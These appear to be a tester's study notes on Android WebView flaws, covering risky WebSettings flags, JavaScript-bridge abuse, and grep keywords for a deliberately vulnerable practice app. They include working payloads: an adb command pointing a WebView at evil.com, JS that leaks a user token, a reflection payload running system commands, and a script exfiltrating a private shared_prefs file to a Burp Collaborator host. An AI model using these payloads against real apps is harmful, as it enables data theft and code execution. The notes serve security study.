- WebView load content from URI using `loadURI`, `loadDate` ,`loadDataWithBaseURL` so make sure to check if any parameter passed to these method are user-controlled throw text_input or intent's Extra data 
	- WebView hijacking accrue when attacker apple to change the content of default loaded site with it's own: `adb shell am start <pakage>/.<activity> -e url "http://evil.com"`
- review if data transmitted in clear text HTTP  

`WebSettings` object used to enable/disable WebView functionalities, here’s some security settings
- if `setJavaScriptEnabled` set to *true*, WebViews can run JS so we can check JS vulns such XSS  
- JavaScript bridge functionality is a way to inject java object into WebView by making them accessible to JavaScript. after android 4.2 methods must be annotated with `@javascriptinterface` in order to be accessible to the JS running in the WebView  
	```java
	//vuln code
	webView.addJavascriptInterface(new WebAppInterface(this), "Android");
	...........
	public static String getUserToken() {
		return UUID.randomUUID().toString(); //Generate user token
	}
	```
	```java
	// WebAppInterface
	.....
	@JavascriptInterface
    public String getUserToken() {
        return SupportWebView.getUserToken();
    }
	```
	attacker can host following poc to execute java code using js to leak data
	```js
	<script type="text/javascript">
		document.write("token: " + Android.getUserToken());
	</script>
	```
	or to execute system commands
	```js
	<script>
	var path = "/data/data/com.tmh.vulnwebview/";
	function execute(cmd) 
	{
		document.write("webview Vulnerability");
		return Android.getClass().forName('java.lang.Runtime').getMethod('getRuntime' , null).invoke( null, null).exec(cmd);
	} 
	execute(['/system/bin/touch', path]); 
	</script>
	```
- if `setAllowContentAccess`  set to *true* , WebView can access content providers view `content://` url
- `setAllowFileAccess` ,`getAllowFileAccessFromFileURLs` if *true* passed to any methods, file system can accessed by `fle://`, 
- `getAllowUniversalAccessFromFileURLs` set to *true*, will allows cross-origin requests from `file://` scheme to access content from any origin
	poc to leak private files
	```js
	<script>  
    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file
    function load(url) {  
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {  
            if (xhr.readyState === 4) {  
	            fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=') + btoa(xhr.responseText)); //send b64 encoded file to attacker  
            }  
        }
        xhr.open('GET', url, true);  
        xhr.send('');  
    }
    load(url);  
	</script>
	```

- `setPluginState`
- `setSavePassword(false)`
- [Universal XSS](https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/)
- https://www.securityweek.com/hackers-can-abuse-ios-webview-make-phone-calls/
- more keywords to grep
```java
loadURL()
evaluateJavascript()
addJavascriptInterface()
onJsPrompt()
shouldOverrideUrlLoading()
shouldInterceptRequest()
```

use [vulnerable webview application](https://github.com/t4kemyh4nd/vulnwebview), [Farah Hawa’s Video in youtube](https://www.youtube.com/watch?v=qS5PkC-37io).to practice on above